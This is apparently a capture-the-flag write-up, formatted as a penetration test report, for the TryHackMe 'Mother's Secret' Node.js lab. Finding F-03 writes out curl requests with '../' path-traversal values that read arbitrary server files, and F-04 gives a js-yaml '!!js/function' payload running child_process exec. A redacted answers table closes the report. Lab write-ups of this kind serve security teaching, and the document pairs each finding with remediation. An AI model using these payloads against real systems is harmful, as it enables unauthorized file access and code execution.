# Penetration Test Report — Mother's Secret
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Application Security (SAST/DAST)  
**Author:** D24yK4r4

---

## Executive Summary

The Mother's Secret challenge simulates the MU-TH-UR 6000 shipboard computer from the *Alien* franchise, running a Node.js/Express web application with a Socket.IO interface. Assessment identified four exploitable vulnerabilities, ranging from information disclosure in client-side JavaScript to path traversal enabling arbitrary file read on the server. By chaining these vulnerabilities in sequence, full access to classified server-side content was achieved without valid credentials.

**Overall Risk: High**

---

## Scope & Methodology

**Target:** `http://<TARGET>/`  
**Approach:** Black-box with provided source code (SAST + DAST)  
**Tools used:** Nuclei, Gobuster, ffuf, curl, ZAP, manual code review

**Methodology:**
1. Passive reconnaissance and tech stack identification
2. Static source code analysis (provided route files)
3. Active endpoint discovery and route mapping
4. Dynamic exploitation — chained vulnerability abuse
5. Post-exploitation file read

---

## Findings

---

### F-01 — Information Disclosure via Client-Side JavaScript

**Severity:** Medium  
**Classification:** CWE-540 — Inclusion of Sensitive Information in Source Code  
**OWASP:** A05:2021 — Security Misconfiguration

**Description:**  
The application serves `index.min.js` which, despite obfuscation, contains sensitive data in a recoverable string array. Two base64-encoded values and internal route names were extracted via manual inspection.

**Evidence:**
```bash
echo "VEhNX0ZMQUd7MFJEM1JfOTM3fQ==" | base64 -d  # → THM_FLAG{REDACTED}
echo "Q0xBU1NJRklFRA==" | base64 -d               # → CLASSIFIED
```

Extracted from decoded string array: route names `/yaml`, `/nostromo`, character name `Ash` (Science Officer).

**Flag found:** `THM_FLAG{REDACTED}`

**Impact:**  
Sensitive flags and internal application structure exposed to any client without authentication.

**Remediation:**  
Never embed sensitive values in client-side code. Obfuscation is not a security control — treat all client-side code as publicly readable.

---

### F-02 — Broken Authentication via Global State Variables

**Severity:** High  
**Classification:** CWE-287 — Improper Authentication  
**OWASP:** A07:2021 — Identification and Authentication Failures

**Description:**  
Authentication state in `Nostromo.js` is managed via module-level global variables (`isNostromoAuthenticate`, `isYamlAuthenticate`). These are shared across all clients — any successful request from any source permanently sets the auth flag for the entire application instance.

**Evidence:**
```javascript
let isNostromoAuthenticate = false;  // global, not session-bound

Router.post("/nostromo", (req, res) => {
  fs.readFile(filePath, "utf8", (err, data) => {
    isNostromoAuthenticate = true;  // set permanently for all clients
    res.status(200).send(data);
  });
});
```

**Impact:**  
Authentication bypass — any client can trigger the auth flag and subsequently access protected endpoints intended for privileged users only.

**Remediation:**  
Authentication state must be session-bound (e.g., using `express-session` or JWT tokens). Never use module-level variables to track per-user authentication state.

---

### F-03 — Path Traversal — Arbitrary File Read

**Severity:** High  
**Classification:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory  
**OWASP:** A01:2021 — Broken Access Control

**Description:**  
All three API routes construct file paths by directly concatenating user-supplied `file_path` input without sanitization. This allows `../` sequences to traverse outside the intended base directory and read arbitrary files from the server filesystem.

**Affected routes:**
- `POST /yaml` — base path `./public/`
- `POST /api/nostromo` — base path `./public/`
- `POST /api/nostromo/mother` — base path `./mother/`

**Evidence:**

Step 1 — YAML route triggered with override filename:
```bash
curl -X POST http://<TARGET>/yaml \
  -H "Content-Type: application/json" \
  -d '{"file_path":"REDACTED.yaml"}'
```
```
FOR SCIENCE OFFICER EYES ONLY  special SECRETS:
REROUTING TO: api/nostromo
ORDER: REDACTED.txt
```

Step 2 — Nostromo route triggered, auth flag set:
```bash
curl -X POST http://<TARGET>/api/nostromo \
  -H "Content-Type: application/json" \
  -d '{"file_path":"REDACTED.txt"}'
```
```
SPECIAL ORDER REDACTED
CREW EXPENDABLE
Flag{REDACTED}
```

**Flag found:** `Flag{REDACTED}`

Step 3 — Secret location disclosed:
```bash
curl -X POST http://<TARGET>/api/nostromo/mother \
  -H "Content-Type: application/json" \
  -d '{"file_path":"secret.txt"}'
```
```
Secret: REDACTED
```

Step 4 — Path traversal to read classified file:
```bash
curl -X POST http://<TARGET>/api/nostromo/mother \
  -H "Content-Type: application/json" \
  -d '{"file_path":"../../../../REDACTED"}'
```
```
Classified information.
Secret: Flag{REDACTED}
```

**Final flag found:** `Flag{REDACTED}`  
**Mother's secret location:** `REDACTED`

**Impact:**  
An unauthenticated attacker can read arbitrary files from the server filesystem, including configuration files, credentials, and sensitive application data.

**Remediation:**  
Sanitize all user-supplied file paths. Use `path.basename()` to strip directory components, or validate against an allowlist of permitted filenames. Reject any input containing `..` sequences.

---

### F-04 — Insecure YAML Deserialization

**Severity:** Critical (theoretical) / Not exploited in this engagement  
**Classification:** CWE-502 — Deserialization of Untrusted Data  
**OWASP:** A08:2021 — Software and Data Integrity Failures  
**Reference:** Known issue with `js-yaml` versions prior to 4.x

**Description:**  
The `/yaml` route uses `yaml.load()` instead of `yaml.safeLoad()`. In older versions of `js-yaml`, this allowed execution of arbitrary JavaScript via special YAML tags.

**Evidence:**
```javascript
res.status(200).send(yaml.load(data));  // unsafe — should use yaml.safeLoad()
```

Theoretical payload (blocked in modern js-yaml versions):
```yaml
!!js/function 'function(){ require("child_process").exec("id") }'
```

**Impact:**  
On vulnerable versions: Remote Code Execution. On current js-yaml (4.x+): not directly exploitable, but the unsafe pattern should still be avoided.

**Remediation:**  
Use `yaml.safeLoad()` or explicitly pass `{ schema: yaml.DEFAULT_SAFE_SCHEMA }`. Never deserialize untrusted YAML with the default unsafe loader.

---

## Findings Summary

| ID | Title | Severity | CWE | OWASP |
|----|-------|----------|-----|-------|
| F-01 | Information Disclosure via Client-Side JS | Medium | CWE-540 | A05:2021 |
| F-02 | Broken Authentication — Global State | High | CWE-287 | A07:2021 |
| F-03 | Path Traversal — Arbitrary File Read | High | CWE-22 | A01:2021 |
| F-04 | Insecure YAML Deserialization | Critical* | CWE-502 | A08:2021 |

*Theoretical in current js-yaml versions.

---

## Answers

| Question | Answer |
|----------|--------|
| Emergency command override number | `REDACTED` |
| Special order number | `REDACTED` |
| Hidden flag in Nostromo route | `Flag{REDACTED}` |
| Science Officer name | `REDACTED` |
| Contents of classified Flag box | `THM_FLAG{REDACTED}` |
| Mother's secret location | `REDACTED` |
| Mother's secret | `Flag{REDACTED}` |

---

*TryHackMe room: Mother's Secret — D24yK4r4*
